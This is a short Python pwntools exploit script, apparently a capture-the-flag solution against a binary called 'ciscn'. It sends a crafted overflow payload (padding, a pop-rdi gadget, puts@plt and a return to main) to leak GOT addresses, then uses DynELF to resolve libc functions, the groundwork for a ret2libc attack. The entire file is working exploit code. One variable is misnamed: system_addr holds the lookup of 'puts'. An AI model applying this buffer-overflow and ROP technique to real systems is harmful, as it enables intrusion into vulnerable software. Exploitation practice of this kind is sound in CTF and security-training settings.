from pwn import *

p = process("./ciscn")
elf = ELF("ciscn")

pop_rdi_ret = 0x400c83

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = elf.symbols["main"]

def leak(addr):
    payload = b"\x00" * 88 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(main_addr)
    
    p.sendlineafter('Input your choice!\n', '1')
    p.sendlineafter('Input your Plaintext to be encrypted\n', payload)
    p.recvuntil('Ciphertext\n\n')
    result_addr = p.recv(7)[:-1].ljust(8, b'\x00')
    
    return result_addr

d = DynELF(leak, elf=elf)
system_addr = d.lookup('puts', 'libc')
print (system_addr)